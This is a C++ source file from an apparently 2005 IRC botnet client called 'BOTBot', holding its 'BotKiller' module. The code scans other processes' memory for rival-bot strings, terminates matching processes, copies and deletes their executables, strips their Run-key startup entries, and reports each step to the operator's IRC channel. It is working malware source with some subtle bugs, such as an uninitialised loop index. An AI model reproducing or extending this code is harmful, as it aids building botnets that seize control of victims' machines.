/*
            BOTBot
            Copyright (C) 2005 RiMp
            This is private software, you must never redistribute this source code
        	Redistribution of binary forms, with or without modification,
        	are permitted provided that the following conditions are met:
	
	        1. The name of the author may not be used to endorse or promote products
	        derived from this software without specific prior written permission.
	        2. The binary and source may not be sold and/or given away for free.
	        3. You can only create binaries for your own usage, not for any
	        third parties.
	        4. The person using this sourcecode is a developer of said sourcecode.

	    	Redistribution and use in source forms, with or without modification,
	    	are not permitted.
		    This license may be changed without prior notice.
		  
			THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
			IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
			OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
			IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
			INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
			NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
			DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
			THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
			(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
			THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
*/

#include "Include.h"
#include "Hell.h"

char sendbuf[MEDBUF];
char string_installregistrystartup[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

char *stristr(const char *str, const char *strSearch)
{
	char *pszSearch, *pszStart, *pszString;
	for (pszStart = (char *)str; *pszStart != NULL; pszStart++)
	{
		for (; ((*pszStart != NULL) && (toupper(*pszStart) != toupper(*strSearch))); pszStart++)
			if (NULL == *pszStart)
				return NULL;
			pszSearch = (char *)strSearch;
			pszString = (char *)pszStart;
			while (toupper(*pszString) == toupper(*pszSearch))
			{
				pszString++;
				pszSearch++;
				if (NULL == *pszSearch)
					return (pszStart);
			}
	}
	return NULL;
}

bool file_exists(char *pszFilePath)
{
	HANDLE hFile;
	
	hFile = CreateFile(pszFilePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hFile);
	return TRUE;
}

bool file_delete(char *pszFilePath)
{
	if (!file_exists(pszFilePath))
		return FALSE;
	if (!DeleteFile(pszFilePath))
		return FALSE;
	return TRUE;
}

void *memmem(const void *buf, const void *pattern, size_t buflen, size_t len)
{
	char *bf = (char *)buf, *pt = (char *)pattern;
	size_t i, j;
	
	if (len > buflen)
		return (void *)NULL;
	for (i = 0; i <= (buflen - len); ++i)
	{
		for (j = 0; j < len; ++j)
			if (pt[j] != bf[i + j])
				break;
			if (j == len)
				return (bf + i);
	}
	return NULL;
}

bool process_killpid(DWORD dwPID)
{
	HANDLE hProcess;
	
	if (GetCurrentProcessId() == dwPID)
		return FALSE;
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
	if (!hProcess)
		return FALSE;
	if (TerminateProcess(hProcess, 0) != 0)
	{
		CloseHandle(hProcess);
		return TRUE;
	}
	CloseHandle(hProcess);
	return FALSE;
}

DWORD WINAPI botkiller_main(LPVOID param)
{
	char szSignature[LOWBUF];
	CRITICAL_SECTION ct;
	DWORD dwTime;
	HANDLE hProcess;
	int nBotsKilled = 0, nBotsRemoved = 0;
	PROCESSENTRY32 pe32;
	
	InitializeCriticalSection(&ct);
	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (!Process32First(hProcess, &pe32))
	{
		CloseHandle(hProcess);
		DeleteCriticalSection(&ct);
		
		BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- There was an error\r\n",BOT->cIRC.cConf.cChan.c_str());
		
		return 0;
	}
	
	BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- BotCheck started\r\n",BOT->cIRC.cConf.cChan.c_str());
	
	
	
	dwTime = GetTickCount();
	
	while (Process32Next(hProcess, &pe32))
	{
		if (GetCurrentProcessId() != pe32.th32ProcessID)
		{
			EnterCriticalSection(&ct);
			if (pe32.cntThreads >= 64)
			{
			}
			else if (botkiller_memscan(pe32.th32ProcessID, szSignature, sizeof(szSignature) - 1))
			{
				if((strcmp(pe32.szExeFile, "mirc.exe") == 0) || (strcmp(pe32.szExeFile,
					"BitComet.exe") == 0) || (strcmp(pe32.szExeFile, "explorer.exe") == 0));
				else if (process_killpid(pe32.th32ProcessID))
				{
					BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- BotKilled -> [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),pe32.szExeFile);
					nBotsKilled++;
					Sleep(FLOOD_DELAY);
					nBotsRemoved += botkiller_removebot(pe32.szExeFile, 0);
				}
			}
			LeaveCriticalSection(&ct);
		}
	}
	CloseHandle(hProcess);
	BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- [%d] killed - %d removed\r\n",BOT->cIRC.cConf.cChan.c_str() , nBotsKilled,nBotsRemoved);
	
	return 0;
}


bool botkiller_memscan(DWORD dwPID, char *pszBuffer, DWORD dwSize)
{
	char *rgpszSignatureList[] =
	{
	    	"PONG",
			"FTP",
			"TFTP",
			"FTPD",
			"IDENTD",
			NULL
	};
	BYTE byBuffer[0x1000];
	DWORD dwAddress = 0, dwBaseAddress, dwOffset = 0, dwRead;
	HANDLE hProcess, hToken;
	int i;
	
	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwPID);
	if (!hProcess)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	
	if (!rgpszSignatureList[i])
		
		printf("@@202 -> %s\n", rgpszSignatureList[i]);
	for (dwBaseAddress = 0; dwBaseAddress < 0x80000000; dwBaseAddress += 0x1000)
	{
		memset(byBuffer, 0, 0x1000);
		if (ReadProcessMemory(hProcess, (void *)dwBaseAddress, byBuffer, 0x1000, &dwRead))
		{
			while ((dwAddress = (DWORD)memmem((const void *)(byBuffer + dwOffset),
				(const void *)rgpszSignatureList[i],
				0x1000 - dwOffset,
				strlen(rgpszSignatureList[i]))))
			{
				dwOffset = dwAddress - (DWORD)byBuffer;
				if ((dwAddress != 0) && (dwOffset != 0))
				{
					strncpy(pszBuffer, rgpszSignatureList[i], dwSize);
					CloseHandle(hToken);
					CloseHandle(hProcess);
					return TRUE;
				}
			}
		}
	}
	
	CloseHandle(hToken);
	CloseHandle(hProcess);
	return FALSE;
}

int botkiller_removebot(char *pszFileName, LPVOID param)
{
	char szFilePath[MAX_PATH], szValueData[MEDBUF], szValueName[MEDBUF], CFILE[MAX_PATH];
	DWORD dwIndex, dwSize1, dwSize2, dwValueType;
	HKEY hKey, rk;
	int i, nReturn = 0;
	
	
	SYSTEMTIME cTime;
	GetLocalTime(&cTime);
	
	memset(szFilePath, 0, sizeof(szFilePath));
	GetWindowsDirectory(szFilePath, sizeof(szFilePath) - 1);
	
	sprintf(CFILE, "%s\\WinBots\\[%d.%d.%d]-[%d.%d].bot", szFilePath,
		cTime.wHour, cTime.wMinute, cTime.wSecond,
		cTime.wDay, cTime.wMonth);
	
	strncat(szFilePath,
		"\\",
		(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	strncat(szFilePath,
		pszFileName,
		(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	
	if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
		if (file_delete(szFilePath))
		{
			
			printf("deleted: %s\n", szFilePath);
			nReturn++;
		}
	}
	
	memset(szFilePath, 0, sizeof(szFilePath));
	GetSystemDirectory(szFilePath, sizeof(szFilePath) - 1);
	strncat(szFilePath,
		"\\",
		(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	strncat(szFilePath,
		pszFileName,
		(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	
	if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
		if (file_delete(szFilePath))
		{
			
			BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- [%s] Has been deleted successfully\r\n",BOT->cIRC.cConf.cChan.c_str(),szFilePath);
			nReturn++;
		}
	}
	
	for (i = 0; i < 2; i++)
	{
		if (!i)
			hKey = HKEY_CURRENT_USER;
		else
			hKey = HKEY_LOCAL_MACHINE;
		if (RegOpenKeyEx(hKey,
			string_installregistrystartup,
			0,
			KEY_ALL_ACCESS,
			&rk) == ERROR_SUCCESS)
		{
			dwIndex = 0;
			dwSize1 = MEDBUF - 1;
			dwSize2 = MEDBUF - 1;
			while (RegEnumValue(rk,
				dwIndex,
				szValueName,
				&dwSize1,
				NULL,
				&dwValueType,
				(BYTE *)&szValueData,
				&dwSize2) == ERROR_SUCCESS)
			{
				if (dwValueType == REG_SZ)
				{
					if (stristr(szValueData, pszFileName))
					{
						if (RegDeleteValue(rk, szValueName) == ERROR_SUCCESS)
						{
							
							BOT->cIRC.SendData("PRIVMSG %s :-BotKiller- [%s] -> [%s]   Has been deleted successfully\r\n",BOT->cIRC.cConf.cChan.c_str(),pszFileName, szValueName);
						}
						nReturn++;
						
					}
				}
				dwSize1 = MEDBUF - 1;
				dwSize2 = MEDBUF - 1;
				dwIndex++;
			}
		}
	}
	return nReturn;
}